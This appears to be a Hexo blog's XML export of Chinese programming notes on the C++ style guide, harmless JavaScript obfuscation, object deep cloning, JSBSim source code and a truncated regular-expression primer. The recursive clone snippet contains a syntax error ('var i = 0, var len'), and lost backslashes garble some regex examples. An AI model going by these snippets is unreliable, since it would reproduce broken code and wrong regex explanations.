    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>C++ 是 Google 的许多开源项目使用的主要开发语言之一。每个 C++ 程序员都知道，该语言具有许多强大的特性，但这种能力带来了复杂性，这反过来又会使代码更容易出错，更难阅读和维护。</p>
<p>本指南的目标是通过详细描述编写 C++ 代码的注意事项来管理这种复杂性。这些规则的存在是为了保持代码库的可管理性，同时仍然允许编码人员高效地使用 C++ 语言功能。</p>
<p>样式，也称为可读性，是我们所说的支配我们的 C++ 代码的约定。术语样式有点用词不当，因为这些约定不仅仅涵盖源文件格式。</p>
<h1 id="风格指南"><a href="#风格指南" class="headerlink" title="风格指南"></a>风格指南</h1><h1 id="风格检查"><a href="#风格检查" class="headerlink" title="风格检查"></a>风格检查</h1><p>Cpplint 是一个命令行工具，用于按照Google 的 C++ 样式指南检查 C/C++ 文件的样式问题。Cpplint 由 Google Inc. 在google/styleguide开发和维护</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://github.com/cpplint/cpplint" target="_blank" rel="noopener">cpplint</a>,by google.</li>
<li><a href="https://google.github.io/styleguide/cppguide.html" target="_blank" rel="noopener">Google C++ Style Guide</a>,by google.</li>
<li><a href="https://zhuanlan.zhihu.com/p/89909623" target="_blank" rel="noopener">四种基本的编程命名规范（匈牙利命名法、驼峰式命名法、帕斯卡命名法、下划线命名法）</a>,by f-zyj.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript代码混淆方法</title>
    <url>/2021/12/17/JavaScript%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>JavaScript代码混淆就是将JavaScript源代码，通过一系列的转换，例如变量/函数/参数重命名、字符串删除等，转换成不可读的东西，同时还能像以前一样工作。</p>
<p>JavaScript Obfuscator Tool是一个免费且高效的 JavaScript 混淆器（包括对 ES2019 的部分支持）。使您的代码更难以复制并防止人们窃取您的工作。例如：</p>
<p>混淆前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Paste your JavaScript code here</span><br><span class="line">function hi() &#123;</span><br><span class="line">  console.log(&quot;Hello World!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">hi();</span><br></pre></td></tr></table></figure>

<p>使用该工具混淆后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(function(_0x70aa38,_0x6395e8)&#123;var _0x57099e&#x3D;_0x192f,_0x7c1cc7&#x3D;_0x70aa38();while(!![])&#123;try&#123;var _0x56bcff&#x3D;-parseInt(_0x57099e(0xf0))&#x2F;0x1*(-parseInt(_0x57099e(0xee))&#x2F;0x2)+-parseInt(_0x57099e(0xef))&#x2F;0x3+parseInt(_0x57099e(0xeb))&#x2F;0x4+parseInt(_0x57099e(0xf3))&#x2F;0x5+-parseInt(_0x57099e(0xf2))&#x2F;0x6+-parseInt(_0x57099e(0xf4))&#x2F;0x7*(-parseInt(_0x57099e(0xea))&#x2F;0x8)+parseInt(_0x57099e(0xed))&#x2F;0x9*(-parseInt(_0x57099e(0xf1))&#x2F;0xa);if(_0x56bcff&#x3D;&#x3D;&#x3D;_0x6395e8)break;else _0x7c1cc7[&#39;push&#39;](_0x7c1cc7[&#39;shift&#39;]());&#125;catch(_0x5a9257)&#123;_0x7c1cc7[&#39;push&#39;](_0x7c1cc7[&#39;shift&#39;]());&#125;&#125;&#125;(_0x4312,0xd7ab0));function _0x192f(_0x596bfb,_0x95be29)&#123;var _0x43126e&#x3D;_0x4312();return _0x192f&#x3D;function(_0x192fed,_0x3ed7b3)&#123;_0x192fed&#x3D;_0x192fed-0xe9;var _0x49c785&#x3D;_0x43126e[_0x192fed];return _0x49c785;&#125;,_0x192f(_0x596bfb,_0x95be29);&#125;function hi()&#123;var _0x445057&#x3D;_0x192f;console[_0x445057(0xec)](_0x445057(0xe9));&#125;function _0x4312()&#123;var _0x4f3249&#x3D;[&#39;Hello\x20World!&#39;,&#39;9485888XtUGcp&#39;,&#39;2200444wypUiR&#39;,&#39;log&#39;,&#39;99CDZgzo&#39;,&#39;29822AbjrMy&#39;,&#39;403245avFbPY&#39;,&#39;43uwDKOW&#39;,&#39;2388280NXrOlo&#39;,&#39;134622vvoFuf&#39;,&#39;6451580kiRbTs&#39;,&#39;7mxMQdg&#39;];_0x4312&#x3D;function()&#123;return _0x4f3249;&#125;;return _0x4312();&#125;hi();</span><br></pre></td></tr></table></figure>

<p>打开Chrome浏览器控制台，将混淆后的代码粘贴并运行，会发现结果是一样的。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://obfuscator.io/" target="_blank" rel="noopener">JavaScript Obfuscator Tool</a>,by obfuscator.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript对象深度克隆</title>
    <url>/2019/10/10/JavaScript%E5%AF%B9%E8%B1%A1%E6%B7%B1%E5%BA%A6%E5%85%8B%E9%9A%86/</url>
    <content><![CDATA[<p>JavaScript并没有提供对象的复制方法，只能借助第三方库或自己实现对象的深度克隆。具体方法如下：</p>
<h1 id="第三方库实现"><a href="#第三方库实现" class="headerlink" title="第三方库实现"></a>第三方库实现</h1><p>实现JavaScript库的深度克隆的第三方库主要有：</p>
<ul>
<li>Underscore —— _.clone()</li>
<li>jQuery —— $.clone() / $.extend()</li>
<li>lodash —— _.clone() / _.cloneDeep()</li>
<li>借助 JSON 全局对象</li>
</ul>
<h2 id="Underscore-——-clone"><a href="#Underscore-——-clone" class="headerlink" title="Underscore —— _.clone()"></a>Underscore —— _.clone()</h2><p>在 Underscore 中有这样一个方法：_.clone()，这个方法实际上是一种浅复制 (shallow-copy)，所有嵌套的对象和数组都是直接复制引用而并没有进行深复制。其代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Create a (shallow-cloned) duplicate of an object.</span><br><span class="line">_.clone &#x3D; function(obj) &#123;</span><br><span class="line">  if (!_.isObject(obj)) return obj;</span><br><span class="line">  return _.isArray(obj) ? obj.slice() : _.extend(&#123;&#125;, obj);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="jQuery-——-clone-extend"><a href="#jQuery-——-clone-extend" class="headerlink" title="jQuery —— $.clone() / $.extend()"></a>jQuery —— $.clone() / $.extend()</h2><p>在 jQuery 中也有这么一个叫 $.clone() 的方法，可是它并不是用于一般的 JS 对象的深复制，而是用于 DOM 对象。与 Underscore 类似，可以通过 $.extend() 方法来完成深复制。值得庆幸的是，在 jQuery 中可以通过添加一个参数来实现递归extend。调用$.extend(true, {}, …)就可以实现深复制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: &#123; f: &#123; g: 1 &#125; &#125;,</span><br><span class="line">    c: [ 1, 2, 3 ]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var y &#x3D; $.extend(&#123;&#125;, x),          &#x2F;&#x2F;shallow copy</span><br><span class="line">    z &#x3D; $.extend(true, &#123;&#125;, x);    &#x2F;&#x2F;deep copy</span><br><span class="line"></span><br><span class="line">y.b.f &#x3D;&#x3D;&#x3D; x.b.f       &#x2F;&#x2F; true</span><br><span class="line">z.b.f &#x3D;&#x3D;&#x3D; x.b.f       &#x2F;&#x2F; false</span><br></pre></td></tr></table></figure>

<h2 id="lodash-——-clone-cloneDeep"><a href="#lodash-——-clone-cloneDeep" class="headerlink" title="lodash —— _.clone() / _.cloneDeep()"></a>lodash —— _.clone() / _.cloneDeep()</h2><p>在lodash中关于复制的方法有两个，分别是<em>.clone()和</em>.cloneDeep()。其中<em>.clone(obj, true)等价于</em>.cloneDeep(obj)。</p>
<h2 id="借助-JSON-全局对象"><a href="#借助-JSON-全局对象" class="headerlink" title="借助 JSON 全局对象"></a>借助 JSON 全局对象</h2><p>针对纯 JSON 数据对象的深复制，使用 JSON 全局对象的 parse 和 stringify 方法来实现深复制也算是一个简单讨巧的方法，但它能正确处理的对象只有 Number, String, Boolean, Array, 扁平对象，即那些能够被 json 直接表示的数据结构。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function jsonClone(obj) &#123;</span><br><span class="line">    return JSON.parse(JSON.stringify(obj));</span><br><span class="line">&#125;</span><br><span class="line">var clone &#x3D; jsonClone(&#123; a:1 &#125;);</span><br></pre></td></tr></table></figure>

<h1 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h1><p>下面是递归实现对象深度克隆的可用方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function clone(obj) &#123;</span><br><span class="line">  &#x2F;&#x2F; Handle the 3 simple types, and null or undefined</span><br><span class="line">  if (null &#x3D;&#x3D; obj || &quot;object&quot; !&#x3D; typeof obj) return obj;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; Handle Date</span><br><span class="line">  if (obj instanceof Date) &#123;</span><br><span class="line">    var copy &#x3D; new Date();</span><br><span class="line">    copy.setTime(obj.getTime());</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; Handle Array</span><br><span class="line">  if (obj instanceof Array) &#123;</span><br><span class="line">    var copy &#x3D; [];</span><br><span class="line">    for (var i &#x3D; 0, var len &#x3D; obj.length; i &lt; len; ++i) &#123;</span><br><span class="line">      copy[i] &#x3D; clone(obj[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; Handle Object</span><br><span class="line">  if (obj instanceof Object) &#123;</span><br><span class="line">    var copy &#x3D; &#123;&#125;;</span><br><span class="line">    for (var attr in obj) &#123;</span><br><span class="line">      if (obj.hasOwnProperty(attr)) copy[attr] &#x3D; clone(obj[attr]);</span><br><span class="line">    &#125;</span><br><span class="line">    return copy;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  throw new Error(&quot;Unable to copy obj! Its type isn&#39;t supported.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://jerryzou.com/posts/dive-into-deep-clone-in-javascript/" target="_blank" rel="noopener">深入剖析 JavaScript 的深复制</a>,by 咀嚼之味.</li>
<li><a href="https://www.jb51.net/article/84541.htm" target="_blank" rel="noopener">深入理解JavaScript中的对象复制(Object Clone)</a>,by jingxian.</li>
<li><a href="https://book.douban.com/subject/11874748/" target="_blank" rel="noopener">JavaScript语言精粹（修订版）</a>,by Douglas Crockford著.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JSBSim源代码分析</title>
    <url>/2020/01/13/JSBSim%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>JSBSim是一个开源跨平台的飞行动力学模型（FDM）软件库，用于模拟航空航天飞行器的飞行动力学。 该库已被纳入飞行模拟软件包FlightGear和OpenEaagles。JSBSim可以独立运行，通过命令行参数指定飞行器和初始状态，进行简单情境下的飞行动力学仿真，也可以将JSBSim作为代码库，编程实现飞行器模型加载，设置输入，获得输出。下面将通过分析JSBSim源代码，研究其实现通用飞行动力学模型的方法。</p>
<h1 id="入口分析"><a href="#入口分析" class="headerlink" title="入口分析"></a>入口分析</h1><p>下面是JSBSim参考手册中的最简单实例，因JSBSim的不断开发，JSBSim参考手册中该编程实例有点过时，因此进行了少量修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;FGFDMExec.h&gt;</span><br><span class="line">#include &lt;sg_path.hxx&gt;</span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  JSBSim::FGFDMExec FDMExec;</span><br><span class="line">  bool result &#x3D; true;</span><br><span class="line"> </span><br><span class="line">  FDMExec.LoadScript(SGPath::fromUtf8(argv[1]));</span><br><span class="line"> </span><br><span class="line">  while (result) result &#x3D; FDMExec.Run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码可知，调用JSBSim的主要方法是利用FGFDMExec类，通过实例化一个FGFDMExec类，就相当于获得了一个运行JSBSim仿真的工具箱，通过这个工具箱就可以调用JSBSim的大部分功能，实现我们要的仿真目标。同时FGFDMExec类通过加载外部飞机的XML脚本，实现飞行动力学模型的通用性。</p>
<h1 id="JSBSim初始化流程"><a href="#JSBSim初始化流程" class="headerlink" title="JSBSim初始化流程"></a>JSBSim初始化流程</h1><p>上述JSBSim最简仿真示例中已包含其初始化流程，采用图示如下：</p>
<p align="center">
    <img src="images/initialization.jpg" width="80%" alt="JSBSim初始化流程"/>
</p>

<center>图1 JSBSim初始化流程</center>

<h2 id="FGFDMExec初始化"><a href="#FGFDMExec初始化" class="headerlink" title="FGFDMExec初始化"></a>FGFDMExec初始化</h2><p>FGFDMExec类在其构造函数中对各个模型进行初始化，具体代码在Allocate函数中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FGFDMExec::FGFDMExec(FGPropertyManager* root, unsigned int* fdmctr)</span><br><span class="line">  : Root(root), RandomEngine(new default_random_engine), FDMctr(fdmctr)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  try &#123;</span><br><span class="line">    Allocate();</span><br><span class="line">  &#125; catch (const string&amp; msg ) &#123;</span><br><span class="line">    cout &lt;&lt; &quot;Caught error: &quot; &lt;&lt; msg &lt;&lt; endl;</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Allocate函数代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool FGFDMExec::Allocate(void)</span><br><span class="line">&#123;</span><br><span class="line">  bool result&#x3D;true;</span><br><span class="line"></span><br><span class="line">  Models.resize(eNumStandardModels);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; First build the inertial model since some other models are relying on</span><br><span class="line">  &#x2F;&#x2F; the inertial model and the ground callback to build themselves.</span><br><span class="line">  &#x2F;&#x2F; Note that this does not affect the order in which the models will be</span><br><span class="line">  &#x2F;&#x2F; executed later.</span><br><span class="line">  Models[eInertial]          &#x3D; new FGInertial(this);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; See the eModels enum specification in the header file. The order of the</span><br><span class="line">  &#x2F;&#x2F; enums specifies the order of execution. The Models[] vector is the primary</span><br><span class="line">  &#x2F;&#x2F; storage array for the list of models.</span><br><span class="line">  Models[ePropagate]         &#x3D; new FGPropagate(this);</span><br><span class="line">  Models[eInput]             &#x3D; new FGInput(this);</span><br><span class="line">  Models[eAtmosphere]        &#x3D; new FGStandardAtmosphere(this);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Assign the Model shortcuts for internal executive use only.</span><br><span class="line">  Propagate &#x3D; (FGPropagate*)Models[ePropagate];</span><br><span class="line">  Inertial &#x3D; (FGInertial*)Models[eInertial];</span><br><span class="line">  Atmosphere &#x3D; (FGAtmosphere*)Models[eAtmosphere];</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Initialize planet (environment) constants</span><br><span class="line">  LoadPlanetConstants();</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Initialize models</span><br><span class="line">  for (unsigned int i &#x3D; 0; i &lt; Models.size(); i++) &#123;</span><br><span class="line">    &#x2F;&#x2F; The Input&#x2F;Output models must not be initialized prior to IC loading</span><br><span class="line">    if (i &#x3D;&#x3D; eInput || i &#x3D;&#x3D; eOutput) continue;</span><br><span class="line"></span><br><span class="line">    LoadInputs(i);</span><br><span class="line">    Models[i]-&gt;InitModel();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Allocate函数代码中需要注意LoadInputs函数，该函数决定各个子模型的初始化顺序，确定各个子模型的输入输出，具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void FGFDMExec::LoadInputs(unsigned int idx)</span><br><span class="line">&#123;</span><br><span class="line">  switch(idx) &#123;</span><br><span class="line">  case ePropagate:</span><br><span class="line">    Propagate-&gt;in.vPQRidot     &#x3D; Accelerations-&gt;GetPQRidot();</span><br><span class="line">    Propagate-&gt;in.vUVWidot     &#x3D; Accelerations-&gt;GetUVWidot();</span><br><span class="line">    Propagate-&gt;in.DeltaT       &#x3D; dT;</span><br><span class="line">    break;</span><br><span class="line">  case eInput:</span><br><span class="line">    break;</span><br><span class="line">  case eInertial:</span><br><span class="line">    Inertial-&gt;in.Position      &#x3D; Propagate-&gt;GetLocation();</span><br><span class="line">    break;</span><br><span class="line">  case eAtmosphere:</span><br><span class="line">    Atmosphere-&gt;in.altitudeASL &#x3D; Propagate-&gt;GetAltitudeASL();</span><br><span class="line">    break;</span><br><span class="line">  case eWinds:</span><br><span class="line">    Winds-&gt;in.AltitudeASL      &#x3D; Propagate-&gt;GetAltitudeASL();</span><br><span class="line">    Winds-&gt;in.DistanceAGL      &#x3D; Propagate-&gt;GetDistanceAGL();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eAuxiliary:</span><br><span class="line">    Auxiliary-&gt;in.Pressure     &#x3D; Atmosphere-&gt;GetPressure();</span><br><span class="line">    Auxiliary-&gt;in.Density      &#x3D; Atmosphere-&gt;GetDensity();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eSystems:</span><br><span class="line">    &#x2F;&#x2F; Dynamic inputs come into the components that FCS manages through properties</span><br><span class="line">    break;</span><br><span class="line">  case ePropulsion:</span><br><span class="line">    Propulsion-&gt;in.Pressure         &#x3D; Atmosphere-&gt;GetPressure();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    break;</span><br><span class="line">  case eAerodynamics:</span><br><span class="line">    Aerodynamics-&gt;in.Alpha     &#x3D; Auxiliary-&gt;Getalpha();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eGroundReactions:</span><br><span class="line">    &#x2F;&#x2F; There are no external inputs to this model.</span><br><span class="line">    GroundReactions-&gt;in.Vground         &#x3D; Auxiliary-&gt;GetVground();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eExternalReactions:</span><br><span class="line">    &#x2F;&#x2F; There are no external inputs to this model.</span><br><span class="line">    break;</span><br><span class="line">  case eBuoyantForces:</span><br><span class="line">    BuoyantForces-&gt;in.Density     &#x3D; Atmosphere-&gt;GetDensity();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eMassBalance:</span><br><span class="line">    MassBalance-&gt;in.GasInertia  &#x3D; BuoyantForces-&gt;GetGasMassInertia();</span><br><span class="line">    MassBalance-&gt;in.GasMass     &#x3D; BuoyantForces-&gt;GetGasMass();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eAircraft:</span><br><span class="line">    Aircraft-&gt;in.AeroForce     &#x3D; Aerodynamics-&gt;GetForces();</span><br><span class="line">    Aircraft-&gt;in.PropForce     &#x3D; Propulsion-&gt;GetForces();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  case eAccelerations:</span><br><span class="line">    Accelerations-&gt;in.J        &#x3D; MassBalance-&gt;GetJ();</span><br><span class="line">    Accelerations-&gt;in.Jinv     &#x3D; MassBalance-&gt;GetJinv();</span><br><span class="line">    ...</span><br><span class="line">    break;</span><br><span class="line">  default:</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FGFDMExec加载飞机配置"><a href="#FGFDMExec加载飞机配置" class="headerlink" title="FGFDMExec加载飞机配置"></a>FGFDMExec加载飞机配置</h2><p>FGFDMExec的LoadScript函数在初始化时负责加载飞机配置，用于初始化各个子模型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool FGFDMExec::LoadScript(const SGPath&amp; script, double deltaT,</span><br><span class="line">                           const SGPath&amp; initfile)</span><br><span class="line">&#123;</span><br><span class="line">  bool result;</span><br><span class="line"></span><br><span class="line">  Script &#x3D; new FGScript(this);</span><br><span class="line">  result &#x3D; Script-&gt;LoadScript(GetFullPath(script), deltaT, initfile);</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FGFDMExec运行"><a href="#FGFDMExec运行" class="headerlink" title="FGFDMExec运行"></a>FGFDMExec运行</h2><p>FGFDMExec的Run函数负责飞行动力学模型的计算，其代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool FGFDMExec::Run(void)</span><br><span class="line">&#123;</span><br><span class="line">  bool success&#x3D;true;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; returns true if success, false if complete</span><br><span class="line">  if (Script !&#x3D; 0 &amp;&amp; !IntegrationSuspended()) success &#x3D; Script-&gt;RunScript();</span><br><span class="line"></span><br><span class="line">  for (unsigned int i &#x3D; 0; i &lt; Models.size(); i++) &#123;</span><br><span class="line">    LoadInputs(i);</span><br><span class="line">    Models[i]-&gt;Run(holding);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  return success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FGFDMExec的Run函数将依次调用各个子模型的Run函数。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2019/03/27/JSBSim%E7%BC%96%E7%A8%8B%E5%AE%9E%E8%B7%B5%E4%B9%8B%E5%85%A5%E9%97%A8/">JSBSim编程实践之入门</a>,by jackhuang.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript正则表达式入门</title>
    <url>/2019/12/30/JavaScript%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>最近在学习逐行剖析 Vue.js 源码的时候，发现Vuejs在模板编译时大量使用正则表达式。因此，将正则表达式的知识再温习一下。</p>
<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>正则表达式是用于匹配字符串中字符组合的模式。在 JavaScript中，正则表达式也是对象。这些模式被用于 RegExp 的 exec 和 test 方法, 以及 String 的 match、matchAll、replace、search 和 split 方法。</p>
<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><p>正则表达式中的特殊字符:</p>
<h3 id=""><a href="#" class="headerlink" title="\"></a>\</h3><p>依照下列规则匹配：</p>
<p>在非特殊字符之前的反斜杠表示下一个字符是特殊字符，不能按照字面理解。例如，前面没有 “&quot; 的 “b” 通常匹配小写字母 “b”，即字符会被作为字面理解，无论它出现在哪里。但如果前面加了 “&quot;，它将不再匹配任何字符，而是表示一个字符边界。</p>
<p>在特殊字符之前的反斜杠表示下一个字符不是特殊字符，应该按照字面理解。详情请参阅下文中的 “转义（Escaping）” 部分。</p>
<p>如果你想将字符串传递给 RegExp 构造函数，不要忘记在字符串字面量中反斜杠是转义字符。所以为了在模式中添加一个反斜杠，你需要在字符串字面量中转义它。/[a-z]\s/i 和 new RegExp(“[a-z]\s”, “i”) 创建了相同的正则表达式：一个用于搜索后面紧跟着空白字符（\s 可看后文）并且在 a-z 范围内的任意字符的表达式。为了通过字符串字面量给 RegExp 构造函数创建包含反斜杠的表达式，你需要在字符串级别和表达式级别都对它进行转义。例如 /[a-z]:\/i 和 new RegExp(“[a-z]:\\“,”i”) 会创建相同的表达式，即匹配类似 “C:&quot; 字符串。</p>
<h3 id="-1"><a href="#-1" class="headerlink" title="^"></a>^</h3><p>匹配输入的开始。如果多行标志被设置为 true，那么也匹配换行符后紧跟的位置。</p>
<p>例如，/^A/ 并不会匹配 “an A” 中的 ‘A’，但是会匹配 “An E” 中的 ‘A’。</p>
<p>当 ‘^’ 作为第一个字符出现在一个字符集合模式时，它将会有不同的含义。反向字符集合 一节有详细介绍和示例。</p>
<h3 id="-2"><a href="#-2" class="headerlink" title="$"></a>$</h3><p>匹配输入的结束。如果多行标示被设置为 true，那么也匹配换行符前的位置。</p>
<p>例如，/t$/ 并不会匹配 “eater” 中的 ‘t’，但是会匹配 “eat” 中的 ‘t’。</p>
<h3 id="-3"><a href="#-3" class="headerlink" title="*"></a>*</h3><p>匹配前一个表达式 0 次或多次。等价于 {0,}。</p>
<p>例如，/bo*/ 会匹配 “A ghost boooooed” 中的 ‘booooo’ 和 “A bird warbled” 中的 ‘b’，但是在 “A goat grunted” 中不会匹配任何内容。</p>
<h3 id="-4"><a href="#-4" class="headerlink" title="+"></a>+</h3><p>匹配前面一个表达式 1 次或者多次。等价于 {1,}。</p>
<p>例如，/a+/ 会匹配 “candy” 中的 ‘a’ 和 “caaaaaaandy” 中所有的 ‘a’，但是在 “cndy” 中不会匹配任何内容。</p>
<h3 id="-5"><a href="#-5" class="headerlink" title="?"></a>?</h3><p>匹配前面一个表达式 0 次或者 1 次。等价于 {0,1}。</p>
<p>例如，/e?le?/ 匹配 “angel” 中的 ‘el’、”angle” 中的 ‘le’ 以及 “oslo’ 中的 ‘l’。</p>
<p>如果紧跟在任何量词 *、 +、? 或 {} 的后面，将会使量词变为非贪婪（匹配尽量少的字符），和缺省使用的贪婪模式（匹配尽可能多的字符）正好相反。例如，对 “123abc” 使用 /\d+/ 将会匹配 “123”，而使用 /\d+?/ 则只会匹配到 “1”。</p>
<p>还用于先行断言中，如本表的 x(?=y) 和 x(?!y) 条目所述。</p>
<h3 id="-6"><a href="#-6" class="headerlink" title="."></a>.</h3><p>小数点）默认匹配除换行符之外的任何单个字符。</p>
<p>例如，/.n/ 将会匹配 “nay, an apple is on the tree” 中的 ‘an’ 和 ‘on’，但是不会匹配 ‘nay’。</p>
<p>如果 s (“dotAll”) 标志位被设为 true，它也会匹配换行符。</p>
<h3 id="n"><a href="#n" class="headerlink" title="\n"></a>\n</h3><p>在正则表达式中，它返回最后的第n个子捕获匹配的子字符串(捕获的数目以左括号计数)。</p>
<p>比如 /apple(,)\sorange\1/ 匹配”apple, orange, cherry, peach.”中的’apple, orange,’ 。</p>
<h3 id="s"><a href="#s" class="headerlink" title="\s"></a>\s</h3><p>匹配一个空白字符，包括空格、制表符、换页符和换行符。等价于[ \f\n\r\t\v\u00a0\u1680\u180e\u2000-\u200a\u2028\u2029\u202f\u205f\u3000\ufeff]。</p>
<p>例如, /\s\w*/ 匹配”foo bar.”中的’ bar’。</p>
<h3 id="w"><a href="#w" class="headerlink" title="\w"></a>\w</h3><p>匹配一个单字字符（字母、数字或者下划线）。等价于 [A-Za-z0-9_]。</p>
<p>例如, /\w/ 匹配 “apple,” 中的 ‘a’，”$5.28,”中的 ‘5’ 和 “3D.” 中的 ‘3’。</p>
<h3 id="W"><a href="#W" class="headerlink" title="\W"></a>\W</h3><p>匹配一个非单字字符。等价于 [^A-Za-z0-9_]。</p>
<p>例如, /\W/ 或者 /[^A-Za-z0-9_]/ 匹配 “50%.” 中的 ‘%’。</p>
<h3 id="x"><a href="#x" class="headerlink" title="(x)"></a>(x)</h3><p>像下面的例子展示的那样，它会匹配 ‘x’ 并且记住匹配项。其中括号被称为捕获括号。</p>
<p>模式 /(foo) (bar) \1 \2/ 中的 ‘(foo)’ 和 ‘(bar)’ 匹配并记住字符串 “foo bar foo bar” 中前两个单词。模式中的 \1 和 \2 表示第一个和第二个被捕获括号匹配的子字符串，即 foo 和 bar，匹配了原字符串中的后两个单词。注意 \1、\2、…、\n 是用在正则表达式的匹配环节，详情可以参阅后文的 \n 条目。而在正则表达式的替换环节，则要使用像 $1、$2、…、$n 这样的语法，例如，’bar foo’.replace(/(…) (…)/, ‘$2 $1’)。$&amp; 表示整个用于匹配的原字符串。</p>
<h2 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h2><table>
<thead>
<tr>
<th>标志</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>g</td>
<td>全局搜索。</td>
</tr>
<tr>
<td>i</td>
<td>不区分大小写搜索。</td>
</tr>
<tr>
<td>m</td>
<td>多行搜索。</td>
</tr>
<tr>
<td>s</td>
<td>允许 . 匹配换行符。</td>
</tr>
<tr>
<td>u</td>
<td>使用unicode码的模式进行匹配。</td>
</tr>
<tr>
<td>y</td>
<td>执行“粘性”搜索,匹配从目标字符串的当前位置开始，可以使用y标</td>
</tr>
</tbody></table>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>正则表达式可以被用于 RegExp 的 exec 和 test 方法以及 String 的 match、replace、search 和 split 方法。使用正则表达式的方法如下：</p>
